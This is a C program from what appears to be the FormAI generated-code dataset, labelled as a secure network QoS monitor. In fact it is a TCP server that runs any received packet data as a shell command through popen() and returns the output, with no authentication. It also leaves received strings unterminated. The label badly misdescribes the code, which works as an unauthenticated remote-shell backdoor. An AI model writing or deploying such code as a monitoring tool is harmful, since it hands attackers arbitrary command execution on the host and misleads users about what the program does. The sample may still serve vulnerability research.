//FormAI DATASET v1.0 Category: Network Quality of Service (QoS) monitor ; Style: secure
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <sys/time.h>
#include <ctype.h>

#define MAX_LISTEN_BACKLOG 5
#define MAX_BUFFER_SIZE 2048
#define TIMEOUT_SEC 5

typedef struct _hoq_packet {
    char id[16];
    int data_len;
    char data[MAX_BUFFER_SIZE];
} hoq_packet;

typedef struct _hoq_response {
    char id[16];
    int status_code;
    char message[MAX_BUFFER_SIZE];
} hoq_response;

int main(int argc, char *argv[]) {
    int listen_sock, conn_sock, optval, ret, max_fd;
    struct sockaddr_in addr;
    socklen_t addr_len;
    fd_set read_fds;
    hoq_packet pkt;
    hoq_response res;
    struct timeval timeout;
    char buffer[MAX_BUFFER_SIZE];
    char *ip_addr = NULL;
    int port = -1;
    FILE *fp = NULL;
    
    optval = 1;
    
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip_address> <port_number>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    ip_addr = argv[1];
    port = atoi(argv[2]);
    
    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }
    
    ret = setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (ret < 0) {
        perror("Error setting socket options");
        exit(EXIT_FAILURE);
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(port);
    
    ret = bind(listen_sock, (const struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        perror("Error binding socket");
        exit(EXIT_FAILURE);
    }
    
    ret = listen(listen_sock, MAX_LISTEN_BACKLOG);
    if (ret < 0) {
        perror("Error listening on socket");
        exit(EXIT_FAILURE);
    }
    
    printf("Listening on %s:%d...\n", ip_addr, port);
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(listen_sock, &read_fds);
        max_fd = listen_sock;
        
        timeout.tv_sec = TIMEOUT_SEC;
        timeout.tv_usec = 0;
        
        ret = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        if (ret < 0) {
            perror("Error in select");
            exit(EXIT_FAILURE);
        } else if (ret == 0) {
            printf("Timed out waiting for connection...\n");
            continue;
        } else {
            if (FD_ISSET(listen_sock, &read_fds)) {
                addr_len = sizeof(addr);
                
                conn_sock = accept(listen_sock, (struct sockaddr *)&addr, &addr_len);
                if (conn_sock < 0) {
                    perror("Error accepting connection");
                    continue;
                }
                
                ret = recv(conn_sock, &pkt, sizeof(pkt), MSG_WAITALL);
                if (ret < 0) {
                    perror("Error receiving packet");
                } else if (ret == 0) {
                    printf("Client closed connection\n");
                } else {
                    printf("Received packet from %s:%d with id=%s\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port), pkt.id);
                    
                    fp = popen(pkt.data, "r");
                    if (!fp) {
                        snprintf(res.id, sizeof(res.id), "%s", pkt.id);
                        res.status_code = 500;
                        snprintf(res.message, sizeof(res.message), "Error executing command: %s", strerror(errno));
                    } else {
                        snprintf(res.id, sizeof(res.id), "%s", pkt.id);
                        res.status_code = 200;
                        memset(res.message, 0, sizeof(res.message));
                        
                        while (fgets(buffer, MAX_BUFFER_SIZE, fp) != NULL) {
                            strncat(res.message, buffer, sizeof(res.message) - strlen(res.message) - 1);
                        }
                        
                        pclose(fp);
                    }
                    
                    ret = send(conn_sock, &res, sizeof(res), 0);
                    if (ret < 0) {
                        perror("Error sending response");
                    } else {
                        printf("Sent response for packet with id=%s\n", pkt.id);
                    }
                }
                
                close(conn_sock);
            }
        }
    }
    
    close(listen_sock);
    
    return 0;
}